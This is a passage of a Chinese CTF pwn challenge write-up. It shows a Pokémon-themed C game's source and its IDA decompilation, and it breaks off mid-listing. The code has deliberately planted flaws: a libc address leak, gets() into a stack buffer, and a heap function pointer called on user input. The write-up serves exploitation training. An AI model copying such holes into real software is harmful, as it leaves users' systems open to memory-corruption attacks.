class="line">        <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">        Skillmenu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="comment">//速度计算</span></span><br><span class="line">                <span class="keyword">if</span>(myspeed&gt;emspeed)&#123;<span class="comment">//我方速度比较快</span></span><br><span class="line">                    myspeed -= emerypoke-&gt;speed;</span><br><span class="line">                    faster=<span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    emspeed -= (*mypoke)-&gt;speed;</span><br><span class="line">                    faster=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//攻击防御计算 //血量计算</span></span><br><span class="line">                <span class="keyword">if</span>(faster)&#123;</span><br><span class="line">                    emhp = emhp - (((*mypoke)-&gt;attack/<span class="number">2</span>)-(emerypoke-&gt;defence/<span class="number">3</span>));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    myhp = myhp - ((emerypoke-&gt;attack/<span class="number">2</span>)-((*mypoke)-&gt;defence/<span class="number">3</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                myspeed+=(*mypoke)-&gt;speed;</span><br><span class="line">                emspeed+=emerypoke-&gt;speed;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(myhp &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Game Over :(&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(emhp &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You win!&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span>(emerypoke-&gt;attack &gt; (*mypoke)-&gt;defence)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Even if you defend, the other party still kills you in seconds&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;The defense succeeded, but nothing happened&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">if</span>(emerypoke-&gt;speed &gt; (*mypoke)-&gt;speed)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not fast enough to escape the fight&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Escape!&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Store</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">    store_again:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;m a merchant from GuanDu city, what do you want to buy?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Attack agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Defensive agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Poké Ball&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.EXIT&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> (choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            money-=<span class="number">75</span>;</span><br><span class="line">            (*mypoke)-&gt;attack+=<span class="number">10</span>;</span><br><span class="line">            (*mypoke)-&gt;defence-=<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            money-=<span class="number">75</span>;</span><br><span class="line">            (*mypoke)-&gt;attack-=<span class="number">10</span>;</span><br><span class="line">            (*mypoke)-&gt;defence+=<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            money-=<span class="number">75</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Are you sure this is not a name change card?&quot;</span>);</span><br><span class="line">            <span class="type">char</span>* newname=<span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">            change++;</span><br><span class="line">            <span class="comment">//scanf(&quot;%15s&quot;,newname);</span></span><br><span class="line">            <span class="comment">//Pokemon_name(mypoke,newname);</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> store_again;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You say: f**king Black-hearted businessman&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Status</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your money: %d\n&quot;</span>,money);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The status of your Pokémon is as follows&quot;</span>);</span><br><span class="line">    Pokemon_print(mypoke);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Over~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_print</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Pokemon name:%s\n&quot;</span>,&amp;(*mypoke)-&gt;name[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hp:%u\n&quot;</span>,(*mypoke)-&gt;hp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AT:%u\n&quot;</span>,(*mypoke)-&gt;attack);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DE:%u\n&quot;</span>,(*mypoke)-&gt;defence);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SP:%u\n&quot;</span>,(*mypoke)-&gt;speed);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_name</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        (*mypoke)-&gt;name[i]=str[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_choose</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">    Start_choose_again:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please choose a pokemon to follow you&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Pika!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Little Fire Dragon!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.Wonderful frog seeds!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.Jenny Turtle!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> (choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">21</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">16</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">8</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">14</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Pikapi&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">25</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">12</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">14</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">14</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Charmander&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">31</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">10</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">11</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">10</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Bulbasaur&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">28</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">9</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">20</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">9</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Squirtle&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> Start_choose_again;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Mainmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.Store&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Out&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Status&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.exit_the_world&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    ex1t=(<span class="type">size_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">    <span class="type">size_t</span> temp=&amp;<span class="built_in">exit</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(ex1t,&amp;temp,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;,-.----.                                           ____                         &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\\    /  \\                  ,-.                   ,&#x27;  , `.                       &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|   :    \\             ,--/ /|                ,-+-,.&#x27; _ |                       &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|   |  .\\ :   ,---.  ,--. :/ |             ,-+-. ;   , ||   ,---.        ,---,  &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;.   :  |: |  &#x27;   ,&#x27;\\ :  : &#x27; /             ,--.&#x27;|&#x27;   |  ;|  &#x27;   ,&#x27;\\   ,-+-. /  | &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|   |   \\ : /   /   ||  &#x27;  /      ,---.  |   |  ,&#x27;, |  &#x27;: /   /   | ,--.&#x27;|&#x27;   | &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|   : .   /.   ; ,. :&#x27;  |  :     /     \\ |   | /  | |  ||.   ; ,. :|   |  ,\&quot;&#x27; | &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;;   | |`-&#x27; &#x27;   | |: :|  |   \\   /    /  |&#x27;   | :  | :  |,&#x27;   | |: :|   | /  | | &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|   | ;    &#x27;   | .; :&#x27;  : |. \\ .    &#x27; / |;   . |  ; |--&#x27; &#x27;   | .; :|   | |  | | &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;:   &#x27; |    |   :    ||  | &#x27; \\ \&#x27;   ;   /||   : |  | ,    |   :    ||   | |  |/  &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;:   : :     \\   \\  / &#x27;  : |--&#x27; &#x27;   |  / ||   : &#x27;  |/      \\   \\  / |   | |--&#x27;   &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|   | :      `----&#x27;  ;  |,&#x27;    |   :    |;   | |`-&#x27;        `----&#x27;  |   |/       &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;`---&#x27;.|              &#x27;--&#x27;       \\   \\  / |   ;/                    &#x27;---&#x27;        &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  `---`                          `----&#x27;  &#x27;---&#x27;                                                                                                     &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my Pokémon World, where you are now in the small town of Kinan, where people and elves get along in harmony! Hey! Your dream is to collect the world&#x27;s most famous mythical QWQ, come on adventurers, and embark on your adventure!&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">                                                                 </span><br></pre></td></tr></table></figure>
+
+<h2 id="aJUjD">0x1 逆向</h2>
+
+<p>checksec查看保护，全保护，将就着看吧。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730778726491-ca099a5d-f39e-4970-8160-a9df5ad2867f.png"></p>
+<p>拖进ida分析，此时要先看init函数，因为里面可能藏了点东西，ex1t是一个指针，分配了一个chunk给它。</p>
+<p>然后给堆上内存赋值exit的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  ex1t = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *(_QWORD *)ex1t = &amp;<span class="built_in">exit</span>;</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来到main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  _BYTE v7[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  Start_print();</span><br><span class="line">  Start_choose(v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You open the Starter Pack and get a hundred coins&quot;</span>);</span><br><span class="line">  money += <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="keyword">while</span> ( money &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Mainmenu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(aWhyDoesTechnol);</span><br><span class="line">      buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">      *((_DWORD *)buf + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">      *((_DWORD *)buf + <span class="number">6</span>) = <span class="number">1</span>;</span><br><span class="line">      *((_DWORD *)buf + <span class="number">5</span>) = <span class="number">1</span>;</span><br><span class="line">      *((_DWORD *)buf + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s so weak...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nWhat you want to say?&quot;</span>);</span><br><span class="line">        gets(v7);</span><br><span class="line">        (*(<span class="type">void</span> (__fastcall **)(_BYTE *))ex1t)(v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            Status(v5);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            Store(v5);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Out(v5);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No money, you out:(&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>有个菜单，开局还送libc地址，这怎么输？</strong></p>
+<p>但是首先会先让你选精灵，money+&#x3D;100，之后，就可以根据菜单去做题了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Mainmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Store&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Out&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Status&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit_the_world&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="sylRr">Start_choose函数</h3>
+
+<p>开局选精灵</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please choose a pokemon to follow you&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1.Pika!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2.Little Fire Dragon!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3.Wonderful frog seeds!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4.Jenny Turtle!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里不急，我们往下面分配内存的代码看。</p>
+<p>无论选什么都会分配0x20（实际上是0x20+0x10，具体请看ctfwiki堆概况章节）的堆块，这里我们并不知道每一个的意思，但是猜出这是一个结构体，和精灵有关，最有可能想到的是精灵的属性，想不到也不用管。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">Start_choose</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please choose a pokemon to follow you&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Pika!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Little Fire Dragon!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Wonderful frog seeds!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.Jenny Turtle!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span 